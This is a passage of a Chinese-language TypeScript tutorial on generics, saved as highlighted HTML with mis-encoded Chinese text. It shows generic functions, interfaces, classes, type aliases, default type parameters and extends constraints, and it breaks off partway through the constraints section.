æ³›å‹å®Œå…¨æŒ‡å—ï¼šå†™æ³•ã€å››å¤§åº”ç”¨åœºæ™¯ä¸é«˜çº§ç”¨æ³•</h2>
<blockquote>
<p>æ³›å‹æ˜¯ TypeScript ä¸­ä¸€ç§ã€Œç±»å‹åŒ–çš„å˜é‡ã€ï¼Œå®ƒä¸é¢„å…ˆæŒ‡å®šå…·ä½“çš„ç±»å‹ï¼Œè€Œæ˜¯åœ¨ä½¿ç”¨æ—¶æ‰ç¡®å®šç±»å‹ã€‚ç®€å•æ¥è¯´ï¼Œæ³›å‹å°±åƒä¸€ä¸ªã€Œç±»å‹å ä½ç¬¦ã€ï¼Œå¯ä»¥åœ¨å‡½æ•°ã€æ¥å£ã€ç±»ã€ç±»å‹åˆ«åä¸­è¢«å¤ç”¨ï¼Œä»è€Œå®ç°<strong>ä¸€å¥—ä»£ç é€‚é…å¤šç§ç±»å‹</strong>ï¼ŒåŒæ—¶é¿å… <code>any</code> ç±»å‹å¸¦æ¥çš„ç±»å‹ä¿¡æ¯ä¸¢å¤±ã€‚</p>
</blockquote>
<p>ä¸¾ä¸ªç®€å•çš„ä¾‹å­ï¼šå¦‚æœæˆ‘ä»¬éœ€è¦ä¸€ä¸ªå‡½æ•°ï¼Œèƒ½å¤Ÿè¿”å›æ•°ç»„çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼ŒåŒæ—¶æ”¯æŒæ•°å­—æ•°ç»„ã€å­—ç¬¦ä¸²æ•°ç»„ç­‰å¤šç§ç±»å‹ï¼Œä¸ç”¨æ³›å‹çš„è¯ï¼Œè¦ä¹ˆå†™å¤šä¸ªé‡è½½å‡½æ•°ï¼Œè¦ä¹ˆä½¿ç”¨ <code>any</code> ç±»å‹ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// å¼Šç«¯ï¼šä¸¢å¤±ç±»å‹æ ¡éªŒï¼Œè¿”å›å€¼ä¸º any ç±»å‹</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">getFirst</span>(<span class="hljs-params">arr: <span class="hljs-built_in">any</span>[]</span>): <span class="hljs-built_in">any</span> {
  <span class="hljs-keyword">return</span> arr[<span class="hljs-number">0</span>];
}

<span class="hljs-keyword">const</span> str = <span class="hljs-title function_">getFirst</span>([<span class="hljs-string">"a"</span>, <span class="hljs-string">"b"</span>, <span class="hljs-string">"c"</span>]); <span class="hljs-comment">// ç±»å‹ä¸º anyï¼Œæ— æ³•è·å¾—è‡ªåŠ¨è¡¥å…¨</span>
<span class="hljs-keyword">const</span> num = <span class="hljs-title function_">getFirst</span>([<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>]); <span class="hljs-comment">// ç±»å‹ä¸º anyï¼Œå­˜åœ¨ç±»å‹å®‰å…¨é£é™©</span>
</code></pre>
<p>è€Œä½¿ç”¨æ³›å‹ï¼Œæˆ‘ä»¬å¯ä»¥å®Œç¾è§£å†³è¿™ä¸ªé—®é¢˜ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// æ³›å‹åŸºç¡€å†™æ³•ï¼šç”¨ &lt;T&gt; å®šä¹‰ç±»å‹å‚æ•°ï¼ŒT å¯çœ‹ä½œä»»æ„åˆæ³•çš„ç±»å‹å˜é‡å</span>
<span class="hljs-keyword">function</span> getFirst&lt;T&gt;(<span class="hljs-attr">arr</span>: T[]): T {
  <span class="hljs-keyword">return</span> arr[<span class="hljs-number">0</span>];
}

<span class="hljs-comment">// ä½¿ç”¨æ—¶è‡ªåŠ¨æ¨å¯¼ç±»å‹ï¼Œä¹Ÿå¯æ˜¾å¼æŒ‡å®šç±»å‹</span>
<span class="hljs-keyword">const</span> str = <span class="hljs-title function_">getFirst</span>([<span class="hljs-string">"a"</span>, <span class="hljs-string">"b"</span>, <span class="hljs-string">"c"</span>]); <span class="hljs-comment">// è‡ªåŠ¨æ¨å¯¼ T ä¸º stringï¼Œè¿”å›å€¼ç±»å‹ä¸º string</span>
<span class="hljs-keyword">const</span> num = getFirst&lt;<span class="hljs-built_in">number</span>&gt;([<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>]); <span class="hljs-comment">// æ˜¾å¼æŒ‡å®š T ä¸º numberï¼Œè¿”å›å€¼ç±»å‹ä¸º number</span>
</code></pre>
<p>è¿™é‡Œçš„ <code>&lt;T&gt;</code> å°±æ˜¯æ³›å‹çš„æ ¸å¿ƒæ ‡è¯†ï¼Œ<code>T</code>ï¼ˆType çš„ç¼©å†™ï¼Œä¹Ÿå¯ä»¥ç”¨ Uã€Vã€Data ç­‰ä»»æ„åˆæ³•åç§°ï¼‰å°±æ˜¯æˆ‘ä»¬å®šä¹‰çš„ã€Œç±»å‹å‚æ•°ã€ï¼Œå®ƒä¼šåœ¨å‡½æ•°è°ƒç”¨æ—¶è¢«å…·ä½“çš„ç±»å‹æ›¿ä»£ï¼Œä»è€Œå®ç°ã€Œä¸€æ¬¡å®šä¹‰ï¼Œå¤šç±»å‹å¤ç”¨ã€ã€‚</p>
<h3 data-id="heading-1">äºŒã€æ³›å‹çš„å››å¤§æ ¸å¿ƒåº”ç”¨åœºæ™¯</h3>
<p>æ³›å‹çš„åº”ç”¨åœºæ™¯ä¸»è¦é›†ä¸­åœ¨<strong>å‡½æ•°ã€æ¥å£ã€ç±»ã€ç±»å‹åˆ«å</strong>è¿™å››ä¸ªæ–¹é¢ï¼Œä¸‹é¢é€ä¸€æ‹†è§£æ¯ç§åœºæ™¯çš„å†™æ³•ä¸å®æˆ˜ç”¨æ³•ã€‚</p>
<h4 data-id="heading-2">åœºæ™¯ 1ï¼šæ³›å‹å‡½æ•°ï¼ˆæœ€å¸¸ç”¨ï¼‰</h4>
<p>æ³›å‹å‡½æ•°æ˜¯æ—¥å¸¸å¼€å‘ä¸­ä½¿ç”¨é¢‘ç‡æœ€é«˜çš„åœºæ™¯ï¼Œæ ¸å¿ƒå†™æ³•æ˜¯ã€Œåœ¨å‡½æ•°ååæ·»åŠ  <code>&lt;ç±»å‹å‚æ•°&gt;</code>ã€ï¼Œç±»å‹å‚æ•°å¯ä»¥åœ¨å‡½æ•°çš„å‚æ•°ã€è¿”å›å€¼ã€å†…éƒ¨å˜é‡ä¸­ä½¿ç”¨ã€‚</p>
<h5 data-id="heading-3">åŸºç¡€å†™æ³•</h5>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// å•ä¸ªç±»å‹å‚æ•°</span>
<span class="hljs-keyword">function</span> wrapValue&lt;T&gt;(<span class="hljs-attr">value</span>: T): { <span class="hljs-attr">value</span>: T } {
  <span class="hljs-keyword">return</span> { value };
}

<span class="hljs-comment">// å¤šä¸ªç±»å‹å‚æ•°ï¼ˆæ”¯æŒå®šä¹‰å¤šä¸ªæ³›å‹å˜é‡ï¼Œç”¨é€—å·åˆ†éš”ï¼‰</span>
<span class="hljs-keyword">function</span> mergeObjects&lt;U, V&gt;(<span class="hljs-attr">obj1</span>: U, <span class="hljs-attr">obj2</span>: V): U &amp; V {
  <span class="hljs-keyword">return</span> { ...obj1, ...obj2 };
}

<span class="hljs-comment">// å®æˆ˜ä½¿ç”¨</span>
<span class="hljs-keyword">const</span> wrapped = wrapValue&lt;<span class="hljs-built_in">boolean</span>&gt;(<span class="hljs-literal">true</span>); <span class="hljs-comment">// è¿”å› { value: boolean }</span>
<span class="hljs-keyword">const</span> merged = <span class="hljs-title function_">mergeObjects</span>({ <span class="hljs-attr">name</span>: <span class="hljs-string">"å¼ ä¸‰"</span> }, { <span class="hljs-attr">age</span>: <span class="hljs-number">28</span> }); <span class="hljs-comment">// è¿”å› { name: string; age: number }</span>
</code></pre>
<h5 data-id="heading-4">å…³é”®ç‰¹æ€§ï¼šç±»å‹å‚æ•°çš„é»˜è®¤å€¼</h5>
<p>å’Œå‡½æ•°å‚æ•°å¯ä»¥è®¾ç½®é»˜è®¤å€¼ä¸€æ ·ï¼Œæ³›å‹çš„ç±»å‹å‚æ•°ä¹Ÿå¯ä»¥è®¾ç½®é»˜è®¤å€¼ã€‚å½“ä½¿ç”¨æ³›å‹æ—¶æ²¡æœ‰æ˜¾å¼æŒ‡å®šç±»å‹å‚æ•°ï¼Œä¸” TypeScript æ— æ³•è‡ªåŠ¨æ¨å¯¼æ—¶ï¼Œä¼šä½¿ç”¨è¿™ä¸ªé»˜è®¤å€¼ã€‚</p>
<p><strong>è¯­æ³•ï¼š<code>&lt;T = é»˜è®¤ç±»å‹&gt;</code></strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// ä¸ºç±»å‹å‚æ•° T è®¾ç½®é»˜è®¤å€¼ string</span>
<span class="hljs-keyword">function</span> getFirst&lt;T = <span class="hljs-built_in">string</span>&gt;(<span class="hljs-attr">arr</span>: T[]): T {
  <span class="hljs-keyword">return</span> arr[<span class="hljs-number">0</span>];
}

<span class="hljs-comment">// æœªæ˜¾å¼æŒ‡å®šç±»å‹ï¼Œä¸”æ— æ³•æ¨å¯¼å…·ä½“ç±»å‹æ—¶ï¼Œä½¿ç”¨é»˜è®¤å€¼ string</span>
<span class="hljs-keyword">const</span> defaultVal = <span class="hljs-title function_">getFirst</span>([]); <span class="hljs-comment">// T ä¸º stringï¼Œè¿”å›å€¼ç±»å‹ä¸º string</span>

<span class="hljs-comment">// è‡ªåŠ¨æ¨å¯¼ç±»å‹ï¼Œè¦†ç›–é»˜è®¤å€¼</span>
<span class="hljs-keyword">const</span> numVal = <span class="hljs-title function_">getFirst</span>([<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>]); <span class="hljs-comment">// T ä¸º numberï¼Œè¿”å›å€¼ç±»å‹ä¸º number</span>
</code></pre>
<h4 data-id="heading-5">åœºæ™¯ 2ï¼šæ³›å‹æ¥å£</h4>
<p>å½“æ¥å£éœ€è¦æ”¯æŒå¤šç§ç±»å‹çš„å±æ€§æˆ–æ–¹æ³•æ—¶ï¼Œæ³›å‹æ¥å£å¯ä»¥è®©æ¥å£å…·å¤‡æ›´å¼ºçš„å¤ç”¨æ€§ã€‚æ ¸å¿ƒå†™æ³•æ˜¯ã€Œåœ¨æ¥å£ååæ·»åŠ  <code>&lt;ç±»å‹å‚æ•°&gt;</code>ã€ï¼Œç±»å‹å‚æ•°å¯ç”¨äºæ¥å£çš„å±æ€§ã€æ–¹æ³•å‚æ•°å’Œè¿”å›å€¼ã€‚</p>
<h5 data-id="heading-6">åŸºç¡€å†™æ³•</h5>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// å®šä¹‰æ³›å‹æ¥å£</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">Result</span>&lt;T&gt; {
  <span class="hljs-attr">code</span>: <span class="hljs-built_in">number</span>;
  <span class="hljs-attr">message</span>: <span class="hljs-built_in">string</span>;
  <span class="hljs-attr">data</span>: T; <span class="hljs-comment">// ç”¨æ³›å‹ T å®šä¹‰ data å±æ€§çš„ç±»å‹</span>
}

<span class="hljs-comment">// ä½¿ç”¨æ—¶æŒ‡å®šå…·ä½“ç±»å‹</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">UserResult</span> = <span class="hljs-title class_">Result</span>&lt;{ <span class="hljs-attr">id</span>: <span class="hljs-built_in">number</span>; <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span> }&gt;;
<span class="hljs-keyword">type</span> <span class="hljs-title class_">ArticleResult</span> = <span class="hljs-title class_">Result</span>&lt;{ <span class="hljs-attr">title</span>: <span class="hljs-built_in">string</span>; <span class="hljs-attr">content</span>: <span class="hljs-built_in">string</span> }&gt;;

<span class="hljs-comment">// å®æˆ˜åº”ç”¨ï¼šæ¥å£è¿”å›å€¼ç±»å‹å®šä¹‰</span>
<span class="hljs-keyword">const</span> <span class="hljs-attr">userRes</span>: <span class="hljs-title class_">UserResult</span> = {
  <span class="hljs-attr">code</span>: <span class="hljs-number">200</span>,
  <span class="hljs-attr">message</span>: <span class="hljs-string">"è¯·æ±‚æˆåŠŸ"</span>,
  <span class="hljs-attr">data</span>: { <span class="hljs-attr">id</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">"å¼ ä¸‰"</span> }
};

<span class="hljs-keyword">const</span> <span class="hljs-attr">articleRes</span>: <span class="hljs-title class_">ArticleResult</span> = {
  <span class="hljs-attr">code</span>: <span class="hljs-number">200</span>,
  <span class="hljs-attr">message</span>: <span class="hljs-string">"è¯·æ±‚æˆåŠŸ"</span>,
  <span class="hljs-attr">data</span>: { <span class="hljs-attr">title</span>: <span class="hljs-string">"TypeScript æ³›å‹æŒ‡å—"</span>, <span class="hljs-attr">content</span>: <span class="hljs-string">"æ³›å‹çš„å››å¤§åº”ç”¨åœºæ™¯..."</span> }
};
</code></pre>
<h5 data-id="heading-7">æ³›å‹æ¥å£ä¸å‡½æ•°ç»“åˆï¼ˆå¸¸ç”¨å®æˆ˜åœºæ™¯ï¼‰</h5>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// å®šä¹‰æ³›å‹æ¥å£ï¼ˆæè¿°å‡½æ•°ç±»å‹ï¼‰</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">RequestFunction</span>&lt;T&gt; {
  (<span class="hljs-attr">url</span>: <span class="hljs-built_in">string</span>): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-title class_">Result</span>&lt;T&gt;&gt;;
}

<span class="hljs-comment">// å®ç°è¯¥æ¥å£çš„å‡½æ•°</span>
<span class="hljs-keyword">const</span> <span class="hljs-attr">getUserInfo</span>: <span class="hljs-title class_">RequestFunction</span>&lt;{ <span class="hljs-attr">id</span>: <span class="hljs-built_in">number</span>; <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span> }&gt; = <span class="hljs-keyword">async</span> (url) =&gt; {
  <span class="hljs-keyword">const</span> res = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(url);
  <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">json</span>();
};
</code></pre>
<h5 data-id="heading-8">å¸¦é»˜è®¤å€¼çš„æ³›å‹æ¥å£</h5>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// ä¸ºæ³›å‹æ¥å£è®¾ç½®é»˜è®¤å€¼</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">Pagination</span>&lt;T = <span class="hljs-built_in">unknown</span>&gt; {
  <span class="hljs-attr">page</span>: <span class="hljs-built_in">number</span>;
  <span class="hljs-attr">size</span>: <span class="hljs-built_in">number</span>;
  <span class="hljs-attr">total</span>: <span class="hljs-built_in">number</span>;
  <span class="hljs-attr">list</span>: T[];
}

<span class="hljs-comment">// æœªæŒ‡å®šç±»å‹ï¼Œä½¿ç”¨é»˜è®¤å€¼ unknown</span>
<span class="hljs-keyword">const</span> <span class="hljs-attr">defaultPagination</span>: <span class="hljs-title class_">Pagination</span> = {
  <span class="hljs-attr">page</span>: <span class="hljs-number">1</span>,
  <span class="hljs-attr">size</span>: <span class="hljs-number">10</span>,
  <span class="hljs-attr">total</span>: <span class="hljs-number">100</span>,
  <span class="hljs-attr">list</span>: []
};

<span class="hljs-comment">// æŒ‡å®šå…·ä½“ç±»å‹ï¼Œè¦†ç›–é»˜è®¤å€¼</span>
<span class="hljs-keyword">const</span> <span class="hljs-attr">userPagination</span>: <span class="hljs-title class_">Pagination</span>&lt;{ <span class="hljs-attr">id</span>: <span class="hljs-built_in">number</span>; <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span> }&gt; = {
  <span class="hljs-attr">page</span>: <span class="hljs-number">1</span>,
  <span class="hljs-attr">size</span>: <span class="hljs-number">10</span>,
  <span class="hljs-attr">total</span>: <span class="hljs-number">100</span>,
  <span class="hljs-attr">list</span>: [{ <span class="hljs-attr">id</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">"å¼ ä¸‰"</span> }]
};
</code></pre>
<h4 data-id="heading-9">åœºæ™¯ 3ï¼šæ³›å‹ç±»</h4>
<p>æ³›å‹ç±»é€‚ç”¨äºã€Œç±»çš„å±æ€§ã€æ–¹æ³•éœ€è¦æ”¯æŒå¤šç§ç±»å‹ã€çš„åœºæ™¯ï¼Œæ¯”å¦‚æ•°æ®å®¹å™¨ã€é˜Ÿåˆ—ã€æ ˆç­‰ã€‚æ ¸å¿ƒå†™æ³•æ˜¯ã€Œåœ¨ç±»ååæ·»åŠ  <code>&lt;ç±»å‹å‚æ•°&gt;</code>ã€ï¼Œç±»å‹å‚æ•°å¯ç”¨äºç±»çš„å±æ€§ã€æ„é€ å‡½æ•°ã€å®ä¾‹æ–¹æ³•ã€‚</p>
<h5 data-id="heading-10">åŸºç¡€å†™æ³•</h5>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// å®šä¹‰æ³›å‹ç±»</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Stack</span>&lt;T&gt; {
  <span class="hljs-keyword">private</span> <span class="hljs-attr">items</span>: T[] = [];

  <span class="hljs-comment">// å…¥æ ˆæ–¹æ³•</span>
  <span class="hljs-title function_">push</span>(<span class="hljs-attr">item</span>: T): <span class="hljs-built_in">void</span> {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">items</span>.<span class="hljs-title function_">push</span>(item);
  }

  <span class="hljs-comment">// å‡ºæ ˆæ–¹æ³•</span>
  <span class="hljs-title function_">pop</span>(): T | <span class="hljs-literal">undefined</span> {
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">items</span>.<span class="hljs-title function_">pop</span>();
  }

  <span class="hljs-comment">// è·å–æ ˆé¡¶å…ƒç´ </span>
  <span class="hljs-title function_">peek</span>(): T | <span class="hljs-literal">undefined</span> {
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">items</span>[<span class="hljs-variable language_">this</span>.<span class="hljs-property">items</span>.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>];
  }
}

<span class="hljs-comment">// ä½¿ç”¨æ—¶æŒ‡å®šå…·ä½“ç±»å‹</span>
<span class="hljs-keyword">const</span> numberStack = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Stack</span>&lt;<span class="hljs-built_in">number</span>&gt;();
numberStack.<span class="hljs-title function_">push</span>(<span class="hljs-number">1</span>);
numberStack.<span class="hljs-title function_">push</span>(<span class="hljs-number">2</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(numberStack.<span class="hljs-title function_">pop</span>()); <span class="hljs-comment">// 2ï¼ˆç±»å‹ä¸º number | undefinedï¼‰</span>

<span class="hljs-keyword">const</span> stringStack = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Stack</span>&lt;<span class="hljs-built_in">string</span>&gt;();
stringStack.<span class="hljs-title function_">push</span>(<span class="hljs-string">"a"</span>);
stringStack.<span class="hljs-title function_">push</span>(<span class="hljs-string">"b"</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(stringStack.<span class="hljs-title function_">peek</span>()); <span class="hljs-comment">// "b"ï¼ˆç±»å‹ä¸º string | undefinedï¼‰</span>
</code></pre>
<h5 data-id="heading-11">å¸¦é»˜è®¤å€¼çš„æ³›å‹ç±»</h5>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// ä¸ºæ³›å‹ç±»è®¾ç½®é»˜è®¤å€¼</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Container</span>&lt;T = <span class="hljs-built_in">string</span>&gt; {
  <span class="hljs-keyword">private</span> <span class="hljs-attr">data</span>: T;

  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">data: T</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">data</span> = data;
  }

  <span class="hljs-title function_">getData</span>(): T {
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">data</span>;
  }
}

<span class="hljs-comment">// æœªæŒ‡å®šç±»å‹ï¼Œä½¿ç”¨é»˜è®¤å€¼ string</span>
<span class="hljs-keyword">const</span> defaultContainer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Container</span>(<span class="hljs-string">"hello"</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(defaultContainer.<span class="hljs-title function_">getData</span>()); <span class="hljs-comment">// "hello"ï¼ˆç±»å‹ä¸º stringï¼‰</span>

<span class="hljs-comment">// æŒ‡å®šå…·ä½“ç±»å‹ï¼Œè¦†ç›–é»˜è®¤å€¼</span>
<span class="hljs-keyword">const</span> numberContainer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Container</span>&lt;<span class="hljs-built_in">number</span>&gt;(<span class="hljs-number">123</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(numberContainer.<span class="hljs-title function_">getData</span>()); <span class="hljs-comment">// 123ï¼ˆç±»å‹ä¸º numberï¼‰</span>
</code></pre>
<blockquote>
<p>æ³¨æ„ï¼šæ³›å‹ç±»åªä½œç”¨äºå®ä¾‹éƒ¨åˆ†ï¼Œé™æ€å±æ€§å’Œé™æ€æ–¹æ³•æ— æ³•ä½¿ç”¨ç±»çš„æ³›å‹å‚æ•°ï¼ˆå› ä¸ºé™æ€æˆå‘˜å±äºç±»æœ¬èº«ï¼Œè€Œæ³›å‹å‚æ•°æ˜¯åœ¨å®ä¾‹åŒ–æ—¶ç¡®å®šçš„ï¼‰ã€‚</p>
</blockquote>
<h4 data-id="heading-12">åœºæ™¯ 4ï¼šæ³›å‹ç±»å‹åˆ«å</h4>
<p>ç±»å‹åˆ«åï¼ˆ<code>type</code>ï¼‰æ˜¯ TypeScript ä¸­å®šä¹‰è‡ªå®šä¹‰ç±»å‹çš„é‡è¦æ–¹å¼ï¼Œæ³›å‹ç±»å‹åˆ«åå¯ä»¥è®©è‡ªå®šä¹‰ç±»å‹å…·å¤‡æ›´å¼ºçš„çµæ´»æ€§ï¼Œæ ¸å¿ƒå†™æ³•æ˜¯ã€Œåœ¨ç±»å‹åˆ«ååæ·»åŠ  <code>&lt;ç±»å‹å‚æ•°&gt;</code>ã€ã€‚</p>
<h5 data-id="heading-13">åŸºç¡€å†™æ³•</h5>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// å®šä¹‰æ³›å‹ç±»å‹åˆ«å</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">Pair</span>&lt;T&gt; = [T, T]; <span class="hljs-comment">// å…ƒç»„ç±»å‹ï¼Œä¸¤ä¸ªå…ƒç´ ç±»å‹ç›¸åŒ</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">Optional</span>&lt;T&gt; = T | <span class="hljs-literal">undefined</span>; <span class="hljs-comment">// å¯é€‰ç±»å‹ï¼ŒT æˆ– undefined</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">RecordMap</span>&lt;K <span class="hljs-keyword">extends</span> <span class="hljs-built_in">string</span> | <span class="hljs-built_in">number</span>, V&gt; = { [key <span class="hljs-keyword">in</span> K]: V }; <span class="hljs-comment">// æ˜ å°„ç±»å‹</span>

<span class="hljs-comment">// ä½¿ç”¨æ—¶æŒ‡å®šå…·ä½“ç±»å‹</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">NumberPair</span> = <span class="hljs-title class_">Pair</span>&lt;<span class="hljs-built_in">number</span>&gt;; <span class="hljs-comment">// [number, number]</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">OptionalString</span> = <span class="hljs-title class_">Optional</span>&lt;<span class="hljs-built_in">string</span>&gt;; <span class="hljs-comment">// string | undefined</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">UserMap</span> = <span class="hljs-title class_">RecordMap</span>&lt;<span class="hljs-built_in">number</span>, { <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>; <span class="hljs-attr">age</span>: <span class="hljs-built_in">number</span> }&gt;; <span class="hljs-comment">// { [key: number]: { name: string; age: number } }</span>

<span class="hljs-comment">// å®æˆ˜åº”ç”¨</span>
<span class="hljs-keyword">const</span> <span class="hljs-attr">pair</span>: <span class="hljs-title class_">NumberPair</span> = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>];
<span class="hljs-keyword">const</span> <span class="hljs-attr">optionalStr</span>: <span class="hljs-title class_">OptionalString</span> = <span class="hljs-string">"hello"</span>;
<span class="hljs-keyword">const</span> <span class="hljs-attr">userMap</span>: <span class="hljs-title class_">UserMap</span> = {
  <span class="hljs-number">1</span>: { <span class="hljs-attr">name</span>: <span class="hljs-string">"å¼ ä¸‰"</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">28</span> },
  <span class="hljs-number">2</span>: { <span class="hljs-attr">name</span>: <span class="hljs-string">"æå››"</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">30</span> }
};
</code></pre>
<h5 data-id="heading-14">å¸¦é»˜è®¤å€¼çš„æ³›å‹ç±»å‹åˆ«å</h5>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// ä¸ºæ³›å‹ç±»å‹åˆ«åè®¾ç½®é»˜è®¤å€¼</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">ResponseData</span>&lt;T = { [<span class="hljs-attr">key</span>: <span class="hljs-built_in">string</span>]: <span class="hljs-built_in">unknown</span> }&gt; = {
  <span class="hljs-attr">success</span>: <span class="hljs-built_in">boolean</span>;
  <span class="hljs-attr">data</span>: T;
};

<span class="hljs-comment">// æœªæŒ‡å®šç±»å‹ï¼Œä½¿ç”¨é»˜è®¤å€¼</span>
<span class="hljs-keyword">const</span> <span class="hljs-attr">defaultResponse</span>: <span class="hljs-title class_">ResponseData</span> = {
  <span class="hljs-attr">success</span>: <span class="hljs-literal">true</span>,
  <span class="hljs-attr">data</span>: { <span class="hljs-attr">id</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">"å¼ ä¸‰"</span> }
};

<span class="hljs-comment">// æŒ‡å®šå…·ä½“ç±»å‹ï¼Œè¦†ç›–é»˜è®¤å€¼</span>
<span class="hljs-keyword">const</span> <span class="hljs-attr">userResponse</span>: <span class="hljs-title class_">ResponseData</span>&lt;{ <span class="hljs-attr">id</span>: <span class="hljs-built_in">number</span>; <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span> }&gt; = {
  <span class="hljs-attr">success</span>: <span class="hljs-literal">true</span>,
  <span class="hljs-attr">data</span>: { <span class="hljs-attr">id</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">"å¼ ä¸‰"</span> }
};
</code></pre>
<h3 data-id="heading-15">ä¸‰ã€é«˜çº§ç”¨æ³•ï¼šç±»å‹å‚æ•°çš„çº¦æŸæ¡ä»¶</h3>
<p>åœ¨æŸäº›åœºæ™¯ä¸‹ï¼Œæˆ‘ä»¬ä¸å¸Œæœ›æ³›å‹å‚æ•°æ˜¯ã€Œä»»æ„ç±»å‹ã€ï¼Œè€Œæ˜¯å¸Œæœ›å®ƒæ»¡è¶³ä¸€å®šçš„çº¦æŸæ¡ä»¶ï¼ˆæ¯”å¦‚æ‹¥æœ‰æŸä¸ªå±æ€§ã€å®ç°æŸä¸ªæ¥å£ï¼‰ã€‚è¿™æ—¶å¯ä»¥ä½¿ç”¨ <code>extends</code> å…³é”®å­—æ¥çº¦æŸæ³›å‹å‚æ•°ï¼Œè¿™å°±æ˜¯ã€Œæ³›å‹çº¦æŸã€ã€‚</p>
<h4 data-id="heading-16">åŸºç¡€çº¦æŸï¼šextends å…³é”®å­—</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// å®šä¹‰ä¸€ä¸ªæ¥å£ï¼Œä½œä¸ºçº¦æŸæ¡ä»¶</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">HasLength</span> {
  <span class="hljs-attr">length</span>: <span class="hljs-built_in">number</span>;
}

<span class="hljs-comment">// çº¦æŸ T å¿…é¡»å®ç° HasLength æ¥å£ï¼ˆå³ T å¿…é¡»æ‹¥æœ‰ length å±æ€§ï¼‰</span>
<span class="hljs-keyword">function</span> getLength&lt;T <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HasLength</span>&gt;(<span class="hljs-attr">value</span>: T): <span class="hljs-built_in">number</span> {
  <span class="hljs-keyword">return</span> value.<span class="hljs-property">length</span>;
}

<span class="hljs-comment">// åˆæ³•ï¼šstring æ‹¥æœ‰ length å±æ€§</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">getLength</span>(<span class="hljs-string">"hello"</span>)); <span class="hljs-comment">// 5</span>

<span class="hljs-comment">// åˆæ³•ï¼šæ•°ç»„æ‹¥æœ‰ length å±æ€§</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">getLength</span>([<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>])); <span class="hljs-comment">// 3</span>

<span class="hljs-comment">// åˆæ³•ï¼šè‡ªå®šä¹‰å¯¹è±¡æ‹¥æœ‰ length å±æ€§</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">getLength</span>({ <span class="hljs-attr">length</span>: <span class="hljs-number">10</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">"æµ‹è¯•"</span> })); <span class="hljs-comment">// 10</span>

<span class="hljs-comment">// ä¸åˆæ³•ï¼šnumber æ²¡æœ‰ length å±æ€§ï¼Œç¼–è¯‘æŠ¥é”™</span>
